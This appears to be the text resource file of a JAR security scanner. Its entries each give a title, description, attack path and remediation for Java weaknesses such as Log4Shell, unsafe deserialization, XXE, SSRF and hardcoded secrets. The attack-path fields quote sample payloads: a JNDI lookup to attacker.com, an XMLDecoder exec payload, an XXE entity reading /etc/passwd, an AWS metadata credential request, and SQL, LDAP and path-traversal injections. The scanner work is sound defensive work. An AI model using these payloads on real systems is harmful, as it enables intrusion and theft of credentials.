patterns.title: JAR Manifest: All-Permissions Requested
patterns.description: The JAR manifest requests 'all-permissions' which grants full access to the system when executed with a security manager. Attackers can abuse this to escape the sandbox.
patterns.attack_path: Malicious or compromised JAR runs with unrestricted OS access, enabling file read/write, network connections, and process execution.
patterns.remediation: Request only the specific permissions your application requires. Avoid 'all-permissions' in production JARs.

patterns.title: JAR Manifest: Java Agent (Agent-Class)
patterns.description: The manifest declares an Agent-Class, allowing this JAR to be loaded as a Java agent via -javaagent flag. Agents can instrument bytecode, intercept method calls, and modify running JVM state.
patterns.attack_path: A malicious agent can rewrite class bytecode at load time, bypass authentication checks, exfiltrate secrets, or install backdoors invisibly.
patterns.remediation: Only ship agent JARs intentionally. Verify any -javaagent JARs in your deployment. Sign and verify agent JARs before use.

patterns.title: JAR Manifest: Java Agent (Premain-Class)
patterns.description: The manifest declares a Premain-Class, marking this JAR as a Java agent that runs before the main application. This allows full bytecode transformation and runtime monitoring.
patterns.attack_path: Premain agents execute before any application code, enabling credential interception, SSL stripping, or silent backdoor installation.
patterns.remediation: Audit any JAR declaring Premain-Class. Ensure it comes from a trusted, verified source.

patterns.title: JAR Manifest: External Class-Path URL
patterns.description: The MANIFEST.MF Class-Path attribute references an external URL or absolute path. This can cause the JVM to load classes from untrusted remote locations.
patterns.attack_path: An attacker who controls the referenced URL can serve malicious classes that execute in the context of the loading application.
patterns.remediation: Use only relative Class-Path entries pointing to local JARs. Never reference remote URLs in MANIFEST.MF.

patterns.title: JAR Manifest: Trusted-Library Flag
patterns.description: The JAR manifest sets Trusted-Library: true, which in older JVM sandbox environments grants elevated trust to code in this JAR.
patterns.attack_path: Abused to bypass legacy applet/JNLP sandboxing and gain access to privileged APIs.
patterns.remediation: Remove Trusted-Library unless explicitly required by a legacy deployment model.

patterns.title: JAR Manifest: Can-Redefine-Classes
patterns.description: The agent manifest requests Can-Redefine-Classes: true, allowing it to replace class definitions at runtime with arbitrary bytecode.
patterns.attack_path: An agent with class redefinition capability can silently replace security-critical classes (e.g., authentication logic) with backdoored versions.
patterns.remediation: Only grant Can-Redefine-Classes to agents that genuinely require it. Verify agent integrity before deployment.

patterns.title: Log4Shell Vulnerable Class (CVE-2021-44228)
patterns.description: The JAR contains JndiLookup.class from log4j-core, the class responsible for Log4Shell (CVE-2021-44228). An attacker who can control logged input can trigger remote code execution via JNDI.
patterns.attack_path: Attacker sends ${jndi:ldap://attacker.com/a} in any logged field. Log4j fetches and executes a remote class, achieving unauthenticated RCE.
patterns.remediation: Upgrade log4j-core to >= 2.17.1 (Java 8) / >= 2.12.4 (Java 7). As a workaround, delete JndiLookup.class from the JAR.

patterns.title: Log4j-Core Vulnerable Version (Log4Shell)
patterns.description: A vulnerable version of log4j-core (< 2.15.0) is bundled. All versions from 2.0-beta9 through 2.14.1 are affected by Log4Shell (CVE-2021-44228).
patterns.attack_path: Any log statement processing attacker-controlled input can trigger JNDI lookup leading to RCE.
patterns.remediation: Upgrade to log4j-core >= 2.17.1. Remove log4j-core entirely if logging can be replaced.

patterns.title: Commons Collections Deserialization Gadget (CVE-2015-4852)
patterns.description: InvokerTransformer from Apache Commons Collections is present. This class is the key component in the most widely exploited Java deserialization gadget chains, enabling RCE via ObjectInputStream.readObject().
patterns.attack_path: Attacker sends a crafted serialized payload to any endpoint that calls ObjectInputStream.readObject(). The InvokerTransformer chain executes arbitrary system commands.
patterns.remediation: Upgrade commons-collections to >= 3.2.2 or >= 4.1. Implement a deserialization filter (Java 9+) or use SerialKiller/NotSoSerial.

patterns.title: Spring4Shell Vulnerable Class (CVE-2022-22965)
patterns.description: The JAR contains Spring Framework's DataBinder class. Combined with Spring MVC on JDK 9+, this is the entry point for Spring4Shell (CVE-2022-22965) — a critical RCE via data binding.
patterns.attack_path: Attacker sends specially crafted HTTP request parameters that exploit ClassLoader data binding, writing a JSP web shell to the server.
patterns.remediation: Upgrade spring-webmvc/spring-beans to >= 5.3.18 or >= 5.2.20. Apply CVE-2022-22965 patch.

patterns.title: Jackson-Databind Vulnerable Version (Polymorphic Deserialization)
patterns.description: A vulnerable version of jackson-databind is bundled. Versions before 2.13.4.1 with enableDefaultTyping() or @JsonTypeInfo are susceptible to polymorphic deserialization RCE (multiple CVEs).
patterns.attack_path: Attacker sends crafted JSON with type hints to a deserializing endpoint, triggering gadget chain execution via JNDI, JDBC URL, or other sinks.
patterns.remediation: Upgrade to jackson-databind >= 2.14.0. Disable default typing. Use allowlist-based type resolution.

patterns.title: XStream Vulnerable Version (CVE-2021-29505 / CVE-2022-40151)
patterns.description: A vulnerable version of XStream (< 1.4.20) is bundled. XStream has a history of critical deserialization vulnerabilities allowing RCE via crafted XML.
patterns.attack_path: Attacker sends malicious XML to any XStream.fromXML() endpoint. Pre-1.4.17 versions have no built-in security framework and allow arbitrary class instantiation.
patterns.remediation: Upgrade XStream to >= 1.4.20. Enable XStream's security framework with an allowlist of permitted types.

patterns.title: SnakeYAML Vulnerable Version (CVE-2022-1471)
patterns.description: SnakeYAML < 2.0 is present. CVE-2022-1471 allows RCE when untrusted YAML is parsed with the default Constructor, enabling arbitrary Java class instantiation.
patterns.attack_path: Attacker sends a YAML payload with !!javax.script.ScriptEngineManager or similar to trigger class instantiation and code execution.
patterns.remediation: Upgrade SnakeYAML to >= 2.0. Use SafeConstructor for untrusted input.

patterns.title: Java Deserialization: ObjectInputStream.readObject()
patterns.description: The code calls ObjectInputStream.readObject() which deserializes untrusted Java object streams. Combined with gadget-chain libraries on the classpath, this enables remote code execution.
patterns.attack_path: Attacker sends a serialized payload to any endpoint reading from an ObjectInputStream. Gadget chains (e.g., Commons Collections, Spring) execute arbitrary commands.
patterns.remediation: Implement a deserialization filter (Java 9+ ObjectInputFilter) with an explicit allowlist. Use JSON/Protobuf instead of Java serialization for external data.

patterns.title: XMLDecoder Deserialization
patterns.description: java.beans.XMLDecoder is used to deserialize XML. XMLDecoder can instantiate arbitrary Java objects and is equivalent to Java serialization for attack purposes.
patterns.attack_path: Attacker provides XML like <object class='java.lang.Runtime'><void method='exec'><array>...</array></void></object> to execute commands.
patterns.remediation: Do not deserialize untrusted XML with XMLDecoder. Use a restricted XML parser or a safe data format (JSON, Protobuf).

patterns.title: Kryo Deserialization Without Registration
patterns.description: Kryo serialization is used. When setRegistrationRequired(false) is set, Kryo can instantiate arbitrary classes from serialized data, similar to Java Object deserialization attacks.
patterns.attack_path: If deserialization input is attacker-controlled and registration is not required, an attacker can provide payloads that instantiate dangerous classes.
patterns.remediation: Set kryo.setRegistrationRequired(true) and register only the classes your application needs.

patterns.title: OS Command Injection: Runtime.exec() / ProcessBuilder
patterns.description: The code uses Runtime.exec() or ProcessBuilder to execute OS commands. If the command or arguments include unsanitized user input, this leads to OS command injection.
patterns.attack_path: Attacker injects shell metacharacters (;, &&, |, $()) into user-controlled input that flows into exec() arguments, executing arbitrary system commands.
patterns.remediation: Never pass user input directly to Runtime.exec() or ProcessBuilder. Validate and sanitize all inputs. Prefer high-level APIs over shell commands.

patterns.title: JNDI Lookup — Potential Injection Sink
patterns.description: JNDI InitialContext.lookup() is called. If the lookup name includes user-controlled data, attackers can redirect the lookup to a malicious LDAP/RMI server to load remote classes (as in Log4Shell).
patterns.attack_path: Attacker provides a JNDI URL such as ldap://attacker.com/Evil to a lookup(), which fetches and instantiates a remote class executing arbitrary code.
patterns.remediation: Never use user-controlled data in JNDI lookup names. Disable JNDI remote class loading via com.sun.jndi.ldap.object.trustURLCodebase=false (Java 8u191+).

patterns.title: Dynamic Script Execution: ScriptEngine.eval()
patterns.description: javax.script.ScriptEngine.eval() executes JavaScript or other scripting languages at runtime. If the script content is user-controlled, this is a direct code injection vulnerability.
patterns.attack_path: Attacker provides malicious script code that calls Java methods, reads files, or executes system commands via the Nashorn/Rhino engine.
patterns.remediation: Never eval() user-controlled content. If scripting is needed, use a sandboxed engine with a restricted ClassShutter/AccessControlContext.

patterns.title: Unsafe Reflection: Class.forName() / getDeclaredMethod()
patterns.description: The code uses Class.forName() or reflection to dynamically load and invoke classes. If the class name or method is user-controlled, this enables arbitrary code execution.
patterns.attack_path: Attacker supplies a class name string that loads a dangerous class (e.g., Runtime, ProcessBuilder) and invokes exec() through reflection.
patterns.remediation: Validate class names against a strict allowlist before using Class.forName(). Avoid reflective invocation with user-controlled method names.

patterns.title: Dynamic Class Loading: URLClassLoader
patterns.description: URLClassLoader is used to load classes from arbitrary URLs at runtime. If the URL is user-controlled, an attacker can serve and execute malicious classes.
patterns.attack_path: Attacker provides a URL pointing to a remote JAR containing a malicious class. URLClassLoader fetches and loads it, executing attacker code.
patterns.remediation: Avoid URLClassLoader with external URLs. If needed, verify the URL against a strict allowlist and validate code signatures.

patterns.title: Weak Hash Algorithm: MD5
patterns.description: MD5 is used for hashing. MD5 is cryptographically broken and vulnerable to collision attacks. It must not be used for security-sensitive purposes such as password hashing, digital signatures, or integrity checks.
patterns.attack_path: Collision attacks allow forging certificates, bypassing integrity checks, or cracking MD5-hashed passwords in seconds using rainbow tables.
patterns.remediation: Replace MD5 with SHA-256 or SHA-3 for integrity checks. For passwords, use bcrypt, scrypt, or Argon2.

patterns.title: Weak Hash Algorithm: SHA-1
patterns.description: SHA-1 is used for hashing. SHA-1 is deprecated for security use due to demonstrated collision attacks (SHAttered). It should not be used for digital signatures or certificate verification.
patterns.attack_path: SHA-1 collisions can be used to forge digital signatures, clone certificates, and bypass file integrity verification.
patterns.remediation: Migrate to SHA-256 or SHA-3 for all new development. Existing uses should be audited for security context.

patterns.title: Weak Cipher: DES / 3DES
patterns.description: DES or Triple-DES (3DES/TDEA) symmetric encryption is used. DES has a 56-bit key (trivially brute-forceable). 3DES is deprecated due to the Sweet32 birthday attack.
patterns.attack_path: Brute-force or meet-in-the-middle attacks can decrypt DES-encrypted data. Sweet32 allows decryption of 3DES data in ~2^32 blocks.
patterns.remediation: Replace with AES-256-GCM or ChaCha20-Poly1305.

patterns.title: Insecure Block Cipher Mode: ECB
patterns.description: AES or another cipher is used in ECB (Electronic Codebook) mode. ECB encrypts each block independently, making it deterministic and revealing plaintext patterns in the ciphertext.
patterns.attack_path: ECB-encrypted images reveal the underlying structure (e.g., the 'ECB penguin'). Identical plaintext blocks produce identical ciphertext blocks, enabling pattern analysis and replay attacks.
patterns.remediation: Use AES/GCM/NoPadding (AES-GCM) or AES/CBC/PKCS5Padding with a random IV.

patterns.title: Hardcoded Cryptographic Key
patterns.description: A cryptographic key is hardcoded as a string literal or byte array. Anyone with access to the JAR can extract the key and decrypt all protected data.
patterns.attack_path: Extract key from JAR using javap/decompiler. Use key to decrypt all encrypted data, forge authentication tokens, or sign malicious payloads.
patterns.remediation: Never hardcode keys. Use a key management service (AWS KMS, HashiCorp Vault) or derive keys from a secure password using PBKDF2/Argon2.

patterns.title: Insecure Randomness: java.util.Random
patterns.description: java.util.Random is used where a cryptographically secure random number generator is needed. java.util.Random is predictable given a seed, making it unsuitable for security tokens, session IDs, or nonces.
patterns.attack_path: Attacker observes a few Random outputs, predicts the seed, and predicts future tokens including session IDs, CSRF tokens, or password reset links.
patterns.remediation: Use java.security.SecureRandom for all security-sensitive randomness.

patterns.title: SQL Injection Risk: Statement Instead of PreparedStatement
patterns.description: The code executes SQL queries using Statement.executeQuery() or execute() with string concatenation instead of PreparedStatement. This is the classic SQL injection pattern.
patterns.attack_path: Attacker injects SQL syntax into user input (e.g., ' OR 1=1 --), bypassing authentication, exfiltrating data, or executing admin operations.
patterns.remediation: Always use PreparedStatement with parameterized queries. Never concatenate user input into SQL strings.

patterns.title: XML External Entity (XXE) Injection
patterns.description: DocumentBuilderFactory is used without disabling external entity processing. This enables XXE attacks that can read local files, perform SSRF, or cause DoS.
patterns.attack_path: Attacker provides XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>, causing the parser to read and return /etc/passwd.
patterns.remediation: Set dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) and dbf.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true).

patterns.title: Path Traversal Risk
patterns.description: File operations use paths derived from user input without canonicalization. Attackers can use ../ sequences to escape the intended directory and read/write arbitrary files.
patterns.attack_path: Attacker sends filename=../../../../etc/passwd to read system files, or writes a web shell to a publicly accessible directory.
patterns.remediation: Canonicalize paths with file.getCanonicalPath() and verify they start with the expected base directory before any file operation.

patterns.title: Zip Slip Path Traversal (CVE-2018-1002200)
patterns.description: ZIP/archive extraction code uses ZipEntry.getName() without checking for path traversal. Zip Slip allows a malicious archive to write files outside the extraction directory.
patterns.attack_path: Malicious archive contains entry '../../.bashrc' or '../../cron.d/backdoor'. Extraction writes these files to the parent filesystem, potentially achieving code execution.
patterns.remediation: After calling ZipEntry.getName(), resolve it against the output directory and verify with canonicalization that the resolved path starts within the target directory.

patterns.title: Server-Side Request Forgery (SSRF) Risk
patterns.description: The code opens connections to URLs that may be user-controlled. If the URL is not validated, an attacker can force the server to make requests to internal services, cloud metadata endpoints, or other restricted resources.
patterns.attack_path: Attacker provides url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ to exfiltrate AWS credentials or scan internal network services.
patterns.remediation: Validate URLs against an allowlist of permitted hosts/schemes. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). Use a dedicated SSRF protection library.

patterns.title: Hardcoded AWS Access Key
patterns.description: An AWS Access Key ID (AKIA...) is hardcoded in the JAR's class files. Anyone with the JAR can extract this key and access AWS services.
patterns.attack_path: Attacker decompiles JAR, extracts AKIA key and secret, authenticates to AWS CLI, and gains access to S3 buckets, EC2 instances, RDS databases, or other cloud resources.
patterns.remediation: Remove hardcoded credentials. Use IAM instance roles, AWS SDK credential chain (environment variables, ~/.aws/credentials), or AWS Secrets Manager.

patterns.title: Hardcoded Private Key Material
patterns.description: PEM-encoded private key material is hardcoded in the JAR. This exposes RSA/EC private keys used for TLS, code signing, or authentication.
patterns.attack_path: Attacker extracts private key, impersonates the server in TLS connections, decrypts captured traffic, or forges code signatures.
patterns.remediation: Never bundle private keys in distributed JARs. Store private keys in a keystore (PKCS#12/JKS) protected by a strong password, or use a HSM.

patterns.title: Hardcoded Stripe API Key
patterns.description: A Stripe live secret key (sk_live_...) is hardcoded in the JAR. This enables unauthorized financial transactions, customer data access, and account takeover.
patterns.attack_path: Attacker extracts key from JAR, uses Stripe API to create charges, read customer data, issue refunds, or transfer funds.
patterns.remediation: Rotate the leaked key immediately in Stripe dashboard. Store secrets in environment variables or a secrets manager, never in code.

patterns.title: Hardcoded GitHub Token
patterns.description: A GitHub personal access token (ghp_, gho_, ghu_, ghs_, or github_pat_) is hardcoded in the JAR. Leaked tokens allow read/write access to repositories and organization data.
patterns.attack_path: Attacker uses token to read private repos, modify code, steal source, or access secrets stored in GitHub Actions.
patterns.remediation: Rotate the token immediately. Use GitHub Actions secrets or a vault. Never store tokens in code.

patterns.title: Hardcoded Google API Key
patterns.description: A Google API key (AIza...) is hardcoded in the JAR, potentially allowing unauthorized use of Google APIs (Maps, Vision, Translate, Firebase, etc.) at the owner's expense.
patterns.attack_path: Attacker uses extracted key to make API calls, incurring billing charges, accessing data, or reaching quota limits that degrade the application.
patterns.remediation: Restrict API keys to specific APIs, referrers, and IPs in Google Cloud Console. Store keys in environment variables, not code.

patterns.title: Hardcoded Password in Source
patterns.description: A password, secret, or credential is hardcoded as a string literal in the class files. Decompiling the JAR reveals the plaintext credential.
patterns.attack_path: Attacker decompiles JAR with jadx/cfr, finds the password/secret string, uses it to authenticate to databases, APIs, or admin interfaces.
patterns.remediation: Externalize credentials to environment variables, .properties files excluded from VCS, or a secrets manager.

patterns.title: Keystore or Certificate File Bundled in JAR
patterns.description: A JKS, PKCS12, or PEM certificate/keystore file is bundled inside the JAR. If the keystore password is weak or also bundled, this exposes private keys.
patterns.attack_path: Attacker extracts .jks/.p12 file with jar -xf or unzip, then brute-forces the keystore password, recovering private keys used for TLS or code signing.
patterns.remediation: Do not bundle keystores in distributable JARs. Use OS-level or cloud key management. If needed, ensure strong passwords stored separately.

patterns.title: TLS Trust-All Certificates (Disabled Validation)
patterns.description: The code implements an X509TrustManager that accepts all certificates (empty checkServerTrusted). This completely disables TLS certificate validation, enabling man-in-the-middle attacks.
patterns.attack_path: Attacker performs MitM with any certificate. All TLS-protected data (credentials, tokens, PII) is visible and modifiable.
patterns.remediation: Never override X509TrustManager. Use the default trust manager. For testing, use a local CA with HttpsURLConnection.setSSLSocketFactory().

patterns.title: Weak TLS Protocol: SSLv3 / TLSv1.0 / TLSv1.1
patterns.description: The code explicitly enables deprecated TLS/SSL protocol versions. SSLv3 is vulnerable to POODLE; TLS 1.0/1.1 are deprecated by RFC 8996 and susceptible to BEAST and others.
patterns.attack_path: Protocol downgrade attacks force the connection to a weak cipher suite. Known attacks (POODLE, BEAST) can decrypt sensitive data.
patterns.remediation: Enforce TLS 1.2 minimum. Prefer TLS 1.3. Remove references to SSLv3, TLSv1, TLSv1.1 from SSLContext.getInstance() calls.

patterns.title: Cleartext HTTP URL in Code
patterns.description: HTTP (not HTTPS) URLs are hardcoded in the JAR. Data sent over HTTP is visible and modifiable by network observers.
patterns.attack_path: Attacker on same network captures HTTP traffic via ARP spoofing, intercepts credentials or session tokens, or injects malicious responses.
patterns.remediation: Replace all http:// URLs with https://. Enforce HSTS. Reject non-TLS connections in server-side configuration.

patterns.title: Hostname Verification Disabled
patterns.description: A custom HostnameVerifier that always returns true is used, disabling hostname verification. Combined with any trusted certificate, this allows MitM with a certificate for a different hostname.
patterns.attack_path: Attacker presents a valid certificate for attacker.com while impersonating api.bank.com. The disabled verifier accepts it, exposing all traffic.
patterns.remediation: Use the default HostnameVerifier. Never return true unconditionally from HostnameVerifier.verify().

patterns.title: Duplicate ZIP Entries (JAR Overlay Attack)
patterns.description: The JAR contains duplicate ZIP entries (same filename appearing more than once). Different JVM implementations parse ZIP files differently — some use the first entry, others the last. This discrepancy enables class shadowing attacks.
patterns.attack_path: A malicious JAR signed with a valid signature for the first entry can contain a second malicious class under the same name that gets loaded by a vulnerable parser, bypassing signature verification.
patterns.remediation: Rebuild the JAR ensuring each entry name is unique. Use jarsigner -verify to check for anomalies. Reject JARs with duplicate entries in security-sensitive pipelines.

patterns.title: Java Core Namespace Squatting
patterns.description: The JAR contains .class files under the java/ or javax/ package namespace. Legitimate JARs must never ship classes in these reserved namespaces. This indicates a class shadowing or bootstrap attack attempt.
patterns.attack_path: A JAR with java/lang/String.class loaded via certain class loaders can replace core JDK classes, enabling arbitrary code execution with JVM-level trust.
patterns.remediation: Reject any third-party JAR containing classes in java.*, javax.*, or sun.* packages. This is almost always malicious.

patterns.title: Dangerous Security Provider via SPI
patterns.description: The JAR registers a custom Java Security Provider via META-INF/services/java.security.Provider. Custom security providers can intercept or replace cryptographic operations.
patterns.attack_path: A malicious security provider can intercept SecureRandom calls to produce predictable values, weaken key generation, or log generated keys to exfiltrate them.
patterns.remediation: Audit any JAR registering a custom security provider. Ensure it comes from a trusted, audited source. Verify the provider implements algorithms correctly.

patterns.title: JAR Contains External Classpath Dependencies
patterns.description: The JAR's MANIFEST.MF Class-Path attribute references other JAR files. If those JARs are absent or replaced by an attacker, the application may load malicious code.
patterns.attack_path: Attacker places a malicious JAR at the Class-Path location before the legitimate JAR is present. JVM loads attacker's code when the main JAR is executed.
patterns.remediation: Verify the integrity of all Class-Path JARs at deployment. Prefer fat-JARs or dependency management systems (Maven, Gradle) over manual Class-Path.

patterns.title: Potential Sensitive Data Logging
patterns.description: Logging calls pass strings that may include sensitive fields like 'password', 'token', or 'secret'. This can leak credentials into log files, monitoring systems, or SIEM tools.
patterns.attack_path: Attacker gains read access to log files (common in misconfigured cloud storage, Splunk, ELK) and extracts plaintext credentials or tokens.
patterns.remediation: Audit logging statements. Mask or redact sensitive fields before logging. Use structured logging with field-level redaction.

patterns.title: LDAP Injection Risk
patterns.description: LDAP search filters are constructed with string concatenation. If user input is included, an attacker can manipulate the filter to bypass authentication or extract unauthorized directory entries.
patterns.attack_path: Attacker injects * or )(&(uid=*) into a username field used in an LDAP search, bypassing authentication or enumerating all users.
patterns.remediation: Use LDAP encoding (e.g., LdapEncoder.filterEncode from Spring LDAP) to escape all user input included in LDAP filters.
